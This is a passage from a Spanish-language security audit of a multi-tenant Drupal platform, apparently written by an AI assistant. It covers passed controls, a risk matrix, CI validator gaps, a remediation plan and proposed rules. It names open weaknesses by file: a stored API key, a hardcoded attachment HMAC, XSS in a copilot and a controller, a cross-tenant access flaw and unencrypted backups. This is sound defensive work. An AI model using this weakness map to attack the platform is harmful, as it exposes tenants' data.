**Remediacion:** Anadir trigger `push: branches: [main]` al job `zap-scan` o crear un job ZAP rapido (5min) que solo compruebe headers.

---

## 7. Areas Aprobadas (20+)

| # | Area | Estado | Evidencia |
|---|------|--------|-----------|
| 1 | SECRET-MGMT-001 para OAuth/SMTP/Stripe/reCAPTCHA | PASS | `settings.secrets.php` con `getenv()` exclusivo |
| 2 | Gemini API key via `key_provider: env` | PASS | `key.key.google_gemini_api_key.yml` |
| 3 | Config/sync sin secrets hardcoded | PASS | `client_secret: ''` en todos los YAML |
| 4 | Stripe webhook HMAC + `hash_equals()` | PASS | `WebhookController`, `StripeConnectService` |
| 5 | CSRF-API-001 en rutas sensibles | PASS | `_csrf_request_header_token: 'TRUE'` en POST/PATCH/DELETE |
| 6 | CSRF-LOGIN-FIX-001 (SSL termination) | PASS | 3 capas: patch + settings + nginx |
| 7 | XSS en support tickets | PASS | `Xss::filter()` con `ALLOWED_TAGS` |
| 8 | XSS en legal/about pages (StaticPageController) | PASS | `sanitizeContent()` con `Xss::filterAdmin()` |
| 9 | JSON-LD `\|json_encode\|raw` | PASS | Seguro por diseno |
| 10 | `escapeHtml()`/`Drupal.checkPlain()` en JS admin | PASS | facturae, tickets |
| 11 | PHPStan security.neon bans | PASS | `run_check` sin `continue-on-error` |
| 12 | Dependency scanning en CI | PASS | Composer + npm audit + Trivy |
| 13 | SSH keys solo en GitHub Secrets | PASS | No `.pem`/`.key` en repo |
| 14 | SecurityHeadersSubscriber completo | PASS | X-Frame-Options, X-Content-Type, Referrer-Policy, Permissions-Policy |
| 15 | VARY-HOST-001 | PASS | Multi-tenant CDN/reverse proxy |
| 16 | OPcache produccion | PASS | `validate_timestamps=0` + FPM reload |
| 17 | Nginx bloqueo archivos sensibles | PASS | `.git`, `update.php`, `.php` en files |
| 18 | HTTP a HTTPS redirect | PASS | Todos los vhosts |
| 19 | `exec()`/`shell_exec()` con `escapeshellarg()` | PASS | `FirmaDigitalService`, `ReviewVideoService` |
| 20 | DEPLOY-MAINTENANCE-SAFETY-001 | PASS | `if: always()` verificado |
| 21 | Redis ACL config (14 checks) | PASS | `validate-redis-config.php` |
| 22 | Tenant isolation validators activos | PASS | 3 validators como `run_check` |
| 23 | PII output masking | PASS | `maskOutputPII()` en copilot y streaming |
| 24 | AUTH-FLOW-E2E-001 | PASS | 7 checks de flujo de autenticacion |

---

## 8. Matriz de Riesgo Consolidada

| ID | Componente | Sev. | Prob. | Impacto | Riesgo | Regla |
|----|-----------|------|-------|---------|--------|-------|
| SEC-C01 | Claude API key en DB | CRIT | Alta | Alto (coste economico + datos) | **MUY ALTO** | SECRET-MGMT-001 |
| SEC-C02 | HMAC adjuntos hardcoded | CRIT | Alta | Alto (PII de tenants) | **MUY ALTO** | AUDIT-SEC-001 |
| SEC-C03 | PII input LLM | CRIT | Alta | Muy alto (multa RGPD) | **MUY ALTO** | AI-GUARDRAILS-PII-001 |
| SEC-C04 | XSS javascript: copilot | CRIT | Media | Alto (robo sesion) | **ALTO** | INNERHTML-XSS-001 |
| SEC-C05 | XSS SuccessCase raw | CRIT | Media | Alto (stored XSS) | **ALTO** | AUDIT-SEC-003 |
| SEC-A01 | SSH known_hosts dinamico | ALTA | Baja | Muy alto (25+ API keys) | **ALTO** | CWE-295 |
| SEC-A07 | Tenant ID type mismatch | ALTA | Alta | Alto (cross-tenant) | **ALTO** | ACCESS-STRICT-001 |
| SEC-A04 | CSP unsafe-inline/eval | ALTA | — | Medio (neutraliza CSP) | **MEDIO** | CSP-POLICY-001 |
| SEC-M04 | Backups sin cifrar | MEDIA | Baja | Alto (datos de tenants) | **MEDIO** | BACKUP-3LAYER-001 |
| SEC-M02 | Workers sin sleep | MEDIA | Alta | Medio (CPU/DoS) | **MEDIO** | SUPERVISOR-SLEEP-001 |

---

## 9. Cobertura del Safeguard System

### 9.1 Estado Actual de Validators de Seguridad

| Validator | Tipo en CI | Area | Bloquea? |
|-----------|-----------|------|----------|
| `validate-tenant-isolation.php` | `run_check` | Tenant isolation queries | Si |
| `validate-views-tenant-isolation.php` | `run_check` | Views tenant filter | Si |
| `validate-cache-key-tenant.php` | `warn_check` | Cache key con tenant | No |
| `validate-api-contract.php` | `warn_check` | CSRF en rutas API | No |
| `validate-route-permissions.php` | `run_check` (no en `--fast`) | Permisos de rutas | Parcial |
| `validate-access-handler-impl.php` | `warn_check` | Access handler impl | No |
| `validate-redis-config.php` | `run_check` | Redis ACL/security | Si |
| `validate-csp-completeness.php` | `warn_check` | CSP headers | No |
| `validate-deploy-safety.php` | `run_check` | Deploy pipeline | Si |
| `validate-backup-health.php` | `run_check` | Backup infra | Si |
| `validate-auth-flow-integrity.php` | `run_check` | Auth flow E2E | Si |

### 9.2 Pre-commit Hooks (lint-staged)

| Patrón de archivos | Validator ejecutado | Cubre seguridad? |
|--------------------|--------------------|--------------------|
| `*.php` | PHPStan L6 | Si (security bans) |
| `*.routing.yml` | `validate-all.sh --fast` | Parcial (excluye route-permissions) |
| `services.yml` | phantom-args, optional-deps, circular-deps, logger-injection | No directamente |
| `*.html.twig` | syntax + ortografia | No (no detecta `\|raw` inseguro) |
| `*.js` | js-syntax | No (no detecta innerHTML sin escape) |
| `CLAUDE.md` | size check | No |

### 9.3 CI Security Pipeline

| Gate | Herramienta | `exit-code: 1`? |
|------|-------------|-----------------|
| Static analysis | PHPStan L6 + phpstan-security.neon | Si |
| Coding standards | PHPCS + DrupalPractice | Si |
| Dependency vulns | Composer audit + npm audit | Si |
| Container scan | Trivy filesystem | Si (CRITICAL/HIGH) |
| DAST | OWASP ZAP | Solo schedule/manual |
| Secret scanning | Trivy secrets (con supresiones) | Si (parcial por SEC-M06) |

---

## 10. Gaps de Validators Identificados

| Gap | Regla violada | Prioridad | Validator sugerido |
|-----|---------------|-----------|-------------------|
| No validator `\|raw` en Twig | AUDIT-SEC-003 | **ALTA** | `validate-twig-raw-audit.php` |
| No validator `checkPII()` en input IA | AI-GUARDRAILS-PII-001 | **ALTA** | `validate-ai-pii-guardrails.php` |
| `validate-api-contract` es `warn_check` | CSRF-API-001 | **ALTA** | Cambiar a `run_check` |
| No validator secrets en `config/sync` | SECRET-MGMT-001 | **MEDIA** | `validate-secrets-in-config-sync.php` |
| No validator raw SQL en servicios | SQL injection | **MEDIA** | `validate-raw-query-audit.php` |
| `validate-access-handler-impl` es `warn_check` | TENANT-ISOLATION-ACCESS-001 | **MEDIA** | Cambiar a `run_check` |
| Trivy suprime `generic-api-key` | SECRET-MGMT-001 | **MEDIA** | Supresiones por path |
| `validate-route-permissions` skip en `--fast` | AUDIT-SEC-002 | **MEDIA** | Incluir en lint-staged |
| ZAP solo en schedule | DAST | **BAJA** | Trigger en push a main |
| No validator innerHTML sin escapeHtml en JS | INNERHTML-XSS-001 | **BAJA** | `validate-js-xss-audit.php` |

---

## 11. Plan de Remediacion Priorizado

### Fase 1 — Inmediata (hoy/manana)

| # | Hallazgo | Accion | Esfuerzo | Archivo(s) |
|---|----------|--------|----------|------------|
| 1 | SEC-C04 | Anadir `isSafeUrl()` en `contextual-copilot.js` | 3 lineas | `contextual-copilot.js` |
| 2 | SEC-C02 | Exception + `getenv()` en `AttachmentUrlService` | 5 lineas | `AttachmentUrlService.php`, `settings.secrets.php` |
| 3 | SEC-A07 | `(int)` cast en access handler | 1 linea | `InteractiveContentAccessControlHandler.php` |
| 4 | SEC-A08 | `composer update google/protobuf` | Comando | `composer.lock` |
| 5 | SEC-C05 | `Xss::filterAdmin()` en controller | 6 lineas | `CaseStudyLandingController.php` |
| 6 | SEC-A05 | `Xss::filterAdmin()` en InfoPagesController | 2 lineas | `InfoPagesController.php` |
| 7 | SEC-A06 | `striptags('<iframe>')` en map.html.twig | 1 linea | `map.html.twig` |

### Fase 2 — Esta semana

| # | Hallazgo | Accion | Esfuerzo |
|---|----------|--------|----------|
| 8 | SEC-C01 | Migrar Claude API key a `getenv()` | 2h |
| 9 | SEC-C03 | `checkPII()` bidireccional en copilot y agents | 4h |
| 10 | SEC-A01 | Fingerprint SSH fijo en 3 workflows | 1h |
| 11 | SEC-A09 | `warn_check` a `run_check` para CSRF | 5min |
| 12 | SEC-M08 | `warn_check` a `run_check` para access handlers | 5min |

### Fase 3 — Proximo sprint

| # | Hallazgo | Accion | Esfuerzo |
|---|----------|--------|----------|
| 13 | SEC-M02 | Sleep en workers Supervisor | 30min |
| 14 | SEC-M03 | MariaDB `bind-address`, `local-infile` | 30min |
| 15 | SEC-M05 | Redis `bind 127.0.0.1` + `users.acl` en repo | 1h |
| 16 | SEC-A10 | Crear `validate-twig-raw-audit.php` | 4h |
| 17 | SEC-M04 | Cifrado backups + capas 2-3 | 8h |
| 18 | SEC-A02 | Nginx hardening completo | 2h |
| 19 | SEC-A03 + SEC-M01 | PHP security ini | 1h |

### Fase 4 — Medio plazo

| # | Hallazgo | Accion | Esfuerzo |
|---|----------|--------|----------|
| 20 | SEC-A04 | CSP nonces + separar frontend/admin | 16h |
| 21 | SEC-M06 | Trivy supresiones por path | 1h |
| 22 | SEC-B06 | ZAP en cada push a main | 2h |
| 23 | Gaps | Crear 4 validators nuevos de seguridad | 16h |

---

## 12. Nuevas Reglas Propuestas

Basadas en los hallazgos de esta auditoria, se proponen las siguientes reglas para incorporar a CLAUDE.md:

| Codigo | Nombre | Descripcion |
|--------|--------|-------------|
| **PII-INPUT-GUARD-001** | Guardrail PII bidireccional | Todo input a LLM externo DEBE pasar por `checkPII()` antes de `callProvider()`/`callAiApiWithTools()`. Output ya cubierto por `maskOutputPII()` |
| **TWIG-RAW-AUDIT-001** | Auditoria `\|raw` obligatoria | Toda variable Twig con `\|raw` DEBE tener sanitizacion verificable en controller/preprocess (`check_markup`, `Xss::filter*`, `Markup::create`) |
| **URL-PROTOCOL-VALIDATE-001** | Validacion protocolo URLs | URLs generadas desde datos externos (LLM, API, user input) insertadas en `href` DEBEN validar protocolo (`http:`/`https:` exclusivamente) |
| **SSH-FINGERPRINT-001** | Fingerprint SSH fijo en CI | Workflows CI/CD DEBEN usar fingerprint SSH pre-almacenado en Secrets. NUNCA `ssh-keyscan` dinamico |
| **NGINX-HARDENING-001** | Hardening Nginx obligatorio | Config Nginx DEBE incluir `server_tokens off`, `ssl_protocols`, rate limiting para login/API |
| **BACKUP-ENCRYPT-001** | Cifrado de backups obligatorio | Backups SQL DEBEN cifrarse con GPG antes de almacenar (local o remoto) |
| **VALIDATOR-SECURITY-RUNCHECK-001** | Validators de seguridad como `run_check` | Validators de CSRF, access handlers y route permissions DEBEN ser `run_check` (bloquean CI), NUNCA `warn_check` |

---

## 13. Glosario de Terminos

| Termino | Definicion |
|---------|-----------|
| **ACL** | Access Control List — mecanismo de Redis 8.0 para definir usuarios con permisos granulares |
| **AEPD** | Agencia Espanola de Proteccion de Datos — organismo regulador del RGPD en Espana |
| **CSRF** | Cross-Site Request Forgery — ataque que forza acciones no autorizadas usando sesion del usuario |
| **CSP** | Content Security Policy — header HTTP que restringe fuentes de contenido ejecutable |
| **CWE** | Common Weakness Enumeration — catalogo estandar de debilidades de software |
| **DAST** | Dynamic Application Security Testing — pruebas de seguridad en aplicacion ejecutandose |
| **DoS** | Denial of Service — ataque que busca hacer un servicio no disponible |
| **GHSA** | GitHub Security Advisory — identificador unico de vulnerabilidades reportadas en GitHub |
| **HMAC** | Hash-based Message Authentication Code — firma criptografica para verificar integridad y autenticidad |
| **HSTS** | HTTP Strict Transport Security — header que fuerza conexiones HTTPS |
| **Key module** | Modulo Drupal para gestionar claves API con diferentes providers (config, env, file) |
| **LLM** | Large Language Model — modelo de lenguaje de IA (Claude, Gemini) |
| **OWASP** | Open Web Application Security Project — organizacion de referencia en seguridad web |
| **PII** | Personally Identifiable Information — datos que identifican a una persona (DNI, NIE, IBAN) |
| **PITR** | Point-In-Time Recovery — capacidad de restaurar base de datos a un momento exacto |
| **RGPD** | Reglamento General de Proteccion de Datos — legislacion europea de privacidad |
| **SAST** | Static Application Security Testing — analisis de seguridad sobre codigo fuente |
| **SCP** | Secure Copy Protocol — transferencia de archivos via SSH |
| **SIEM** | Security Information and Event Management — sistema centralizado de logs de seguridad |
| **TOFU** | Trust On First Use — modelo donde se confia en la primera conexion a un servidor |
| **XSS** | Cross-Site Scripting — inyeccion de scripts maliciosos en paginas web |
| **ZAP** | Zed Attack Proxy — herramienta OWASP de testing de seguridad DAST |

---

## 14. Registro de Cambios

| Fecha | Version | Autor | Descripcion |
|-------|---------|-------|-------------|
| 2026-03-26 | 1.0.0 | IA Asistente (Claude Opus 4.6) | Auditoria inicial: 5 criticas, 10 altas, 8 medias, 6 bajas, 20+ aprobadas. 3 capas auditadas (infra + app + safeguard) |
